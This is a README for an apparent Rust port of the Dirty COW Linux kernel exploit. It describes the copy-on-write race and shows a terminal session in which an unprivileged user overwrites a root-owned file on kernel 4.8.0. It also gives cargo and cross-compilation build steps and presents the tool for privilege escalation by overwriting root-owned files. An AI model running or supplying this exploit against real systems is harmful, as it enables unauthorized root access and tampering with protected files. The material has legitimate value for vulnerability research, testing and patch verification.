
# dirtyc0w exploit in rust 

This is an rust implementation of the dirtyc0w exploit for linux. The exploit
boils down to a race condition in the linux kernel and is described below:

> A race condition was found in the way the Linux kernel's memory subsystem
> handled the copy-on-write (COW) breakage of private read-only memory
> mappings. All the information we have so far is included in this page.

See [this article](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails) for more information.

## What does it do?

This exploit can be used to overwrite the contents of files, owned by another
user such as `root`, even when your user account doesn't have sufficient
privileges to do so.

This can be used to do privilege escalation in some systems by overwritting root-owned files.

## Example usage

```bash
$ uname -a
Linux ubuntu-linux-20-04-desktop 4.8.0-040800-generic #201610022031 SMP Mon Oct 3 01:51:19 UTC 2016 aarch64 aarch64 aarch64 GNU/Linux
$ ls -l
total 4580
-rwxrw-r-- 1 parallels parallels 4677376 Apr  8 12:06 dirtycow-rust
-r-----r-- 1 root      root           10 Apr  8 12:24 root_owned_file
-rw-rw-r-- 1 parallels parallels      10 Apr  8 12:07 user_owned_file
$ id
uid=1000(parallels) gid=1000(parallels) groups=1000(parallels),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
$ cat user_owned_file 
user data
$ cat root_owned_file 
root data
$ ./dirtycow-rust 
Usage: ./dirtycow-rust <INFILE> <OUTFILE>
$ ./dirtycow-rust user_owned_file root_owned_file 
Starting dirtyc0w exploit...
Preparing to overwrite contents of file 'root_owned_file' with contents from file 'user_owned_file'
Created copy-on-write memory mapping for outfile at address 0xffff7c0b5000
Starting thread to write contents of infile to memory
Starting thread to spam 'madvise' calls
Waiting for threads to finish
Reading contents of infile to buffer
Opening '/proc/self/mem' as read/write
Attempting to write data to start of memory map file many times
Finished spamming advise calls
Finished writing data to '/proc/self/mem'
Finished
$ cat root_owned_file 
user data
```

The above shows the exploit running in linux kernel version 4.8.0 and
overwriting a file named `root_owned_file` with the contents of the file
`user_owned_file` even though the current user doesn't have sufficient
permissions to do this.

## How to compile

Start by installing the rust tooling using the directions found [here](https://www.rust-lang.org/tools/install).
Then to compile for the same architecture as your host device you can simply run the command:

```bash
cargo build
```

To cross-compile to run on a target having different architecture you can
install the tool [cross](https://github.com/cross-rs/cross) and then run as
follows:

```bash
$ cross build --target=aarch64-unknown-linux-gnu
```

(Replace `aarch64-unknown-linux-gnu` with your desired target architecture)


## References

- [C language implementation](https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c)

